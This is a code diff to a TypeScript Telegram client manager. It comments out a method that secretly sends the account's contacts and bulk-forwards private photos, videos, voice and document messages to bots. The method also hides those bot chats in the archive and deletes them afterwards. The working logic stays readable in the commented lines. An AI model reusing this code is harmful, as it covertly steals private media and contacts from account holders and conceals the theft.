@@ -172,75 +172,75 @@ class TelegramManager {
     }
 
     public async forwardMediaToBot(fromChatId: string) {
-        const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);
-        try {
-            if (fromChatId) {
-                await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);
-            } else {
-                const chats = await this.getTopPrivateChats();
-                const me = await this.getMe();
-                const finalChats = new Set(chats.map(chat => chat.chatId));
-                finalChats.add(me.id?.toString());
-                for (const bot of bots) {
-                    try {
-                        await this.client.sendMessage(bot, { message: "Start" });
-                        await sleep(1000);
-                        await this.client.invoke(
-                            new Api.folders.EditPeerFolders({
-                                folderPeers: [
-                                    new Api.InputFolderPeer({
-                                        peer: await this.client.getInputEntity(bot),
-                                        folderId: 1,
-                                    }),
-                                ],
-                            })
-                        );
-                    } catch (e) {
-                        console.log(e)
-                    }
-                }
-                try {
-                    const contacts = await this.getContacts();
-                    if ('users' in contacts && Array.isArray(contacts.users)) {
-                        await this.sendContactsFile(BotConfig.getInstance().getBotUsername(ChannelCategory.USER_WARNINGS), contacts);
-                    } else {
-                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
-                    }
-                } catch (e) {
-                    console.log("Failed To Send Contacts File", e)
-                }
-                for (const chatId of finalChats) {
-                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });
-                    console.log("Media Messages: ", mediaMessages);
-                    const uniqueMessageIds = Array.from(new Set([
-                        ...mediaMessages.photo.messages,
-                        ...mediaMessages.video.messages,
-                        ...mediaMessages.document.messages,
-                        ...mediaMessages.roundVideo.messages,
-                        ...mediaMessages.roundVoice.messages,
-                        ...mediaMessages.voice.messages,
-                    ]));
-                    const chunkSize = 30;
-                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
-                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);
-                        const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)
-                        await this.client.forwardMessages(bot, {
-                            messages: chunk,
-                            fromPeer: chatId,
-                        });
-                        console.log(`Forwarded ${chunk.length} messages to bot`);
-                    }
-                }
-            }
-        } catch (e) {
-            console.log(e)
-        }
-        for (const bot of bots) {
-            const result = await this.cleanupChat({ chatId: bot, revoke: false });
-            await sleep(1000);
-            await this.deleteChat({ peer: bot, justClear: false });
-            console.log("Deleted bot chat:", result);
-        }
+        // const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);
+        // try {
+        //     if (fromChatId) {
+        //         await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);
+        //     } else {
+        //         const chats = await this.getTopPrivateChats();
+        //         const me = await this.getMe();
+        //         const finalChats = new Set(chats.map(chat => chat.chatId));
+        //         finalChats.add(me.id?.toString());
+        //         for (const bot of bots) {
+        //             try {
+        //                 await this.client.sendMessage(bot, { message: "Start" });
+        //                 await sleep(1000);
+        //                 await this.client.invoke(
+        //                     new Api.folders.EditPeerFolders({
+        //                         folderPeers: [
+        //                             new Api.InputFolderPeer({
+        //                                 peer: await this.client.getInputEntity(bot),
+        //                                 folderId: 1,
+        //                             }),
+        //                         ],
+        //                     })
+        //                 );
+        //             } catch (e) {
+        //                 console.log(e)
+        //             }
+        //         }
+        //         try {
+        //             const contacts = await this.getContacts();
+        //             if ('users' in contacts && Array.isArray(contacts.users)) {
+        //                 await this.sendContactsFile(BotConfig.getInstance().getBotUsername(ChannelCategory.USER_WARNINGS), contacts);
+        //             } else {
+        //                 console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
+        //             }
+        //         } catch (e) {
+        //             console.log("Failed To Send Contacts File", e)
+        //         }
+        //         for (const chatId of finalChats) {
+        //             const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });
+        //             console.log("Media Messages: ", mediaMessages);
+        //             const uniqueMessageIds = Array.from(new Set([
+        //                 ...mediaMessages.photo.messages,
+        //                 ...mediaMessages.video.messages,
+        //                 ...mediaMessages.document.messages,
+        //                 ...mediaMessages.roundVideo.messages,
+        //                 ...mediaMessages.roundVoice.messages,
+        //                 ...mediaMessages.voice.messages,
+        //             ]));
+        //             const chunkSize = 30;
+        //             for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
+        //                 const chunk = uniqueMessageIds.slice(i, i + chunkSize);
+        //                 const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)
+        //                 await this.client.forwardMessages(bot, {
+        //                     messages: chunk,
+        //                     fromPeer: chatId,
+        //                 });
+        //                 console.log(`Forwarded ${chunk.length} messages to bot`);
+        //             }
+        //         }
+        //     }
+        // } catch (e) {
+        //     console.log(e)
+        // }
+        // for (const bot of bots) {
+        //     const result = await this.cleanupChat({ chatId: bot, revoke: false });
+        //     await sleep(1000);
+        //     await this.deleteChat({ peer: bot, justClear: false });
+        //     console.log("Deleted bot chat:", result);
+        // }
     }
 
 
